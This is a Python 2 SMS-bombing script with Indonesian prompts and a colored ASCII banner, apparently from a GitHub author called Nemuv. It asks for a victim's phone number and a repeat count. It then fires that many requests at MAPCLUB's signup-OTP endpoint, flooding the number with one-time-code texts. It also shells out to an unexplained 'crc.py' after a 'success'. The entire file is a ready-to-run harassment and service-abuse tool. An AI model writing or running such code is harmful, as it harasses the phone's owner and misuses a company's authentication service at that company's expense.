# silakan di recode :)

#coding=utf-8

import os,sys,requests,time
from requests import post
import subprocess

def bersih():
    os.system('clear')

def lagi():
    f = raw_input(" \033[30;1m[\033[31;1m•\033[30;1m] \033[0;37mCoba Lagi\033[30;1m? \033[30;1m[\033[0;31my\033[0;32m/\033[0;31mn\033[30;1m] :\033[31;1m•\033[0;37m>\033[30;1m> \033[30;1m")
    if f == "y":
       subprocess.call("python2 Spam-Sms1.py",shell=True)
    elif f == "t":
         print (" Exit")
	 sys.exit()

bersih()
banner ="""\033[34m
                                       
                                       
    .--.     ___ .-. .-.       .--.    
  /  _  \   (   )   '   \    /  _  \   
 . .' `. ;   |  .-.  .-. ;  . .' `. ;  
 | '   | |   | |  | |  | |  | '   | |  
 _\_`.(___)  | |  | |  | |  _\_`.(___) 
\033[34;1m(   ). '.    | |  | |  | | (   ). '.   
 | |  `\ |   | |  | |  | |  | |  `\ |  
 ; '._,' '   | |  | |  | |  ; '._,' '  
  '.___.'   (___)(___)(___)  '.___.'   """
print (banner)
print ""
print "\033[30;1m[\033[31;1m× \033[35;1m═════════════════════════════════\033[30;1m]\033[31;1m•\033[30;1m[\033[35;1m════════════╗"
print "    \033[35;1m║   \033[33;1mAuthor   \033[30;1m[\033[31;1m:\033[30;1m]  \033[32;1mNemuv                        \033[35;1m║"
print "    \033[35;1m║   \033[33;1mYouTube  \033[30;1m[\033[31;1m:\033[30;1m]  \033[32;1mNemCroco                     \033[35;1m║"
print "    \033[35;1m║   \033[33;1mGithub   \033[30;1m[\033[31;1m:\033[30;1m]  \033[32;1mhttps://github.com/NemuvSpZi \033[35;1m║"
print "    \033[35;1m╚══════════════════════════════════════════════╝"

print "	     \033[35;1m╔═══════════════════╗"
print "	    \033[30;1m[\033[31;1m-\033[30;1m]  \033[33;1mM A P C L U B  \033[30;1m[\033[31;1m-\033[30;1m]"
print ""

no = input("    \033[30;1m[\033[31;1m-\033[30;1m] \033[32;1mNomor  \033[35;1m: \033[34;1m")
jl = int(input("    \033[30;1m[\033[31;1m-\033[30;1m] \033[32;1mJumlah \033[35;1m: \033[34;1m"))
head = {
"Connection": "keep-alive",
"User-Agent": "Mozilla/5.0 (Linux; Android 6.0; A1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36",
}


dat = {
"phone": no,
}
for i in range(jl):
    r = requests.post("https://cmsapi.mapclub.com/api/signup-otp",headers=head, data=dat)

if 'error' in r.text:
         print('\n \033[30;1m[\033[31;1m•\033[30;1m] \033[0;37mSpam \033[0;30;1mTidak \033[0;33mTerkirim\033[0;31m!')
else:
        os.system('python2 crc.py')
	print "\n  	    \033[35;1m╔═══════════════════╗"
        print "  	   \033[30;1m[\033[31;1m-\033[30;1m]   \033[33;1mR E S U L T   \033[30;1m[\033[31;1m-\033[30;1m]"
	print ""
	time.sleep(2)
	print ('       \033[30;1m[ \033[31;1m- \033[30;1m] \033[34;1mSpam Succes \033[32;1m✓ ')


def lrint():
	print ""
lrint()
